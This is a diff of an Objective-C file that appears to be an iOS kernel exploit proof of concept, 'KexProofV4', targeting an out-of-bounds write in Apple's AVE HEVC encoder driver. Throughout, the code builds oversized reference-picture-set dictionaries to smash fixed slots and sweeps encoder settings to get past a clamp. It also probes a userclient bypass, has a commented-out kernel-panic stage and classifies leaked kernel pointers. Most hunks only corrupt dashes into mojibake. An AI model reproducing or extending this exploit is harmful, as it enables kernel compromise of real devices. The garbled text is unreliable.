@@ -7,7 +7,7 @@
 #import <mach/mach.h>
 #import <dlfcn.h>
 
-// IOKit userclient API (declared manually — CI SDK headers vary). This is the
+// IOKit userclient API (declared manually â€” CI SDK headers vary). This is the
 // bypass path around VideoToolbox's NTL clamp (ollie: IOConnectCallStructMethod
 // into AppleAVE2UserClient directly).
 typedef unsigned int kp_io_object_t;
@@ -27,7 +27,7 @@ extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t se
                                                const void *inputStruct, size_t inputStructCnt,
                                                void *outputStruct, size_t *outputStructCnt);
 
-// Records CMSampleBuffer attachments per encoded frame — the reference-frame
+// Records CMSampleBuffer attachments per encoded frame â€” the reference-frame
 // tokens/POC/slots the DPB parser wants fed BACK into UserDPBFramesForFaceTime.
 static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
     NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
@@ -88,7 +88,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
 
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
-    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
+    [report appendString:@"=== KexProofV4 Â· H9 Encoder OOB Write ===\n"];
     [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
@@ -108,7 +108,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
 
     // Phase 2: build RPS dictionary with the keys AVE_HEVC_ST_RPS_Retrieve reads
     // (AVE_CFDict_GetBool on flags + delta arrays; >16 elements overflows the
-    // fixed HEVC_SHORT_TERM_RPS slots). Both key spellings kept — unknown keys
+    // fixed HEVC_SHORT_TERM_RPS slots). Both key spellings kept â€” unknown keys
     // are ignored, so covering DeltaPocS0 and DeltaPOCS0Minus1 can only help.
     [report appendString:@"\n--- Phase 2: build RPS ---\n"];
     NSMutableArray *deltaS0 = [NSMutableArray array];
@@ -119,13 +119,13 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     }
     // Real RPS keys recovered from the ave27 binary (stage9/15 string table):
     // AbsDeltaRPSMinus1 + DeltaRPSSign + NumNegativePics/NumPositivePics.
-    // DeltaPOCS0Minus1/DeltaPocS0 never existed — that is why -19640/-12912.
+    // DeltaPOCS0Minus1/DeltaPocS0 never existed â€” that is why -19640/-12912.
     NSDictionary *rpsDict = @{
         @"AbsDeltaRPSMinus1": deltaS0,
         @"DeltaRPSSign": deltaS1,
         @"NumNegativePics": @32,
         @"NumPositivePics": @32,
-        // legacy spellings — ignored if unknown, kept as harmless fallbacks
+        // legacy spellings â€” ignored if unknown, kept as harmless fallbacks
         @"DeltaPOCS0Minus1": deltaS0,
         @"DeltaPOCS1Minus1": deltaS1,
         @"DeltaPocS0": deltaS0,
@@ -139,7 +139,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     // Phase 3: RPS validation ladder, NO gates (per 120328 log analysis:
     // EnableUserRefForFacetime on this session poisons EncodeFrame (-19640 even
     // on clean IDR) and EnableUserRPSForFaceTime is unsupported (-12900). The
-    // plain setter reaches AVE_HEVC_ST_RPS_Retrieve directly — proven by the
+    // plain setter reaches AVE_HEVC_ST_RPS_Retrieve directly â€” proven by the
     // videocodecd SIGABRT. Ladder: sane small dict first (does ANY RPS
     // validate?), then the inflated 32+32 OOB shape).
     [report appendString:@"\n--- Phase 3: RPS validation ladder (no gates) ---\n"];
@@ -185,7 +185,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     CFRelease(session);
     session = NULL;
 
-    // Phase 4: FRESH session — encode[0] clean IDR (no RPS), frames 1..2 carry
+    // Phase 4: FRESH session â€” encode[0] clean IDR (no RPS), frames 1..2 carry
     // the smashed RPS via frameProps.
     [report appendString:@"\n--- Phase 4: fresh session, clean IDR then RPS smash ---\n"];
     VTCompressionSessionRef s4 = NULL;
@@ -196,13 +196,13 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     [report appendFormat:@"fresh session create -> %d\n", (int)st4];
     if (st4 == noErr && s4) {
         // ollie: Stage 13 encoded clean because its sessions carried
-        // EncoderUsage=1 + 420v — s4 needs the same profile or encode dies.
+        // EncoderUsage=1 + 420v â€” s4 needs the same profile or encode dies.
         int usage4 = 1;
         CFNumberRef nu4 = CFNumberCreate(NULL, kCFNumberIntType, &usage4);
         VTSessionSetProperty(s4, CFSTR("EncoderUsage"), nu4);
         CFRelease(nu4);
         // ollie: without PrepareToEncodeFrames the frameProps RPS dict is
-        // rejected at the first frame (-19640) — init the encoder context first.
+        // rejected at the first frame (-19640) â€” init the encoder context first.
         OSStatus prep4 = VTCompressionSessionPrepareToEncodeFrames(s4);
         [report appendFormat:@"s4 PrepareToEncodeFrames -> %d\n", (int)prep4];
     }
@@ -247,7 +247,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
 
     // === RCMode acceptance sweep (ollie): which mode un-clamps NTL? ===
     // Probe: EncoderUsage=1 + temporal gates + RCMode=rc + NTL=3, then readback.
-    // readback==3 means NTL survives VT validation — that mode arms the driver.
+    // readback==3 means NTL survives VT validation â€” that mode arms the driver.
     [report appendString:@"\n--- RCMode sweep 0..63 (NTL=3 probe) ---\n"];
     int unclampedRC[64];
     int unclampedCount = 0;
@@ -278,7 +278,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         CFRelease(sR);
     }
     [report appendFormat:@"RCMode unclamped NTL=3: %d mode(s)%s\n", unclampedCount,
-     unclampedCount ? "" : " (NTL clamped for every mode — deeper gate or entitlement)"];
+     unclampedCount ? "" : " (NTL clamped for every mode â€” deeper gate or entitlement)"];
 
     // Private-key ladder (ave27 stage15 had a "private-key audit (23 keys)"):
     // the driver may read NumOfTemporalLayer (singular) while the public
@@ -358,15 +358,15 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         VTSessionSetProperty(sN, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
         VTSessionSetProperty(sN, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
         VTSessionSetProperty(sN, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
-        VTSessionSetProperty(sN, kVTCompressionPropertyKey_NumberOfTemporalLayers, (__bridge CFNumberRef)@3);
+        VTSessionSetProperty(sN, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
         int pre = -1, post = -1;
         CFNumberRef rbPre = NULL;
-        if (VTSessionCopyProperty(sN, kVTCompressionPropertyKey_NumberOfTemporalLayers, NULL, &rbPre) == noErr && rbPre) {
+        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPre) == noErr && rbPre) {
             CFNumberGetValue(rbPre, kCFNumberIntType, &pre); CFRelease(rbPre);
         }
         VTCompressionSessionPrepareToEncodeFrames(sN);
         CFNumberRef rbPost = NULL;
-        if (VTSessionCopyProperty(sN, kVTCompressionPropertyKey_NumberOfTemporalLayers, NULL, &rbPost) == noErr && rbPost) {
+        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPost) == noErr && rbPost) {
             CFNumberGetValue(rbPost, kCFNumberIntType, &post); CFRelease(rbPost);
         }
         [report appendFormat:@"  spec[%lu] create=%d readback PRE=%d POST=%d %s\n",
@@ -449,7 +449,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         CFRelease(n);
         if (useRC) {
             // ollie: AllowTemporalCompression + RealTime are the master switches
-            // for NTL>1 on H16 — without them VT clamps NTL to 1 even with
+            // for NTL>1 on H16 â€” without them VT clamps NTL to 1 even with
             // RCMode=20. Rates must be set BEFORE NTL.
             OSStatus atc = VTSessionSetProperty(s2, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
             OSStatus rt = VTSessionSetProperty(s2, CFSTR("RealTime"), kCFBooleanTrue);
@@ -463,7 +463,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
             n = CFNumberCreate(NULL, kCFNumberIntType, &rc);
             rcSt = VTSessionSetProperty(s2, CFSTR("RCMode"), n);
             CFRelease(n);
-            // Read back gate VALUES — status 0 means "set ok", not "value 0".
+            // Read back gate VALUES â€” status 0 means "set ok", not "value 0".
             int atcVal = -1, rcVal = -1;
             CFTypeRef gv = NULL;
             if (VTSessionCopyProperty(s2, CFSTR("AllowTemporalCompression"), NULL, &gv) == noErr && gv) {
@@ -486,7 +486,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
         if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
         // Per ollie + AVE112705 reference: NO PrepareToEncodeFrames and NO
-        // AllowFrameReordering — Prepare makes VideoToolbox clamp NTL to 1 in
+        // AllowFrameReordering â€” Prepare makes VideoToolbox clamp NTL to 1 in
         // user-space (readback=1 at every N) and the kernel formula never runs.
         CVPixelBufferRef pb2 = NULL;
         CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
@@ -855,9 +855,9 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
     // === UserDPB element schema probe (analyst) ===
     // last_ok=0/first_rejection=1 means the validator rejects the ELEMENT
     // structure, not the array length. Candidates: CFNumber token, CFData blob,
-    // dicts with POC/Slot / FrameID / Index — fed both via VTSessionSetProperty
+    // dicts with POC/Slot / FrameID / Index â€” fed both via VTSessionSetProperty
     // AND via frameProperties. The encode callback dumps the sample-buffer
-    // attachments — those are the reference-frame tokens the parser wants back.
+    // attachments â€” those are the reference-frame tokens the parser wants back.
     [report appendString:@"\n--- UserDPB element schema probe ---\n"];
     NSMutableArray *cbSink = [NSMutableArray array];
     NSDictionary *encSpec = @{
@@ -925,7 +925,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         CFRelease(sS);
     }
 
-    // === stage9 PANIC RUNG — DISABLED ===
+    // === stage9 PANIC RUNG â€” DISABLED ===
     // To enable: uncomment the block below
     // [report appendString:@"\n--- stage9: PANIC RUNG (NTL=16463) ---\n"];
     // VTCompressionSessionRef s9 = NULL;
@@ -988,7 +988,7 @@ static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags f
         if (checked > 500) break;
         checked++;
 
-        // Per 120328 analysis: classify every candidate — the 0xffffffe0..ef
+        // Per 120328 analysis: classify every candidate â€” the 0xffffffe0..ef
         // band (old "heap" check) is LE int32 pairs from codec tables.
         kptr_class_t cls = KPClassifyKPtr(kaddr);
         if (checked <= 20) {
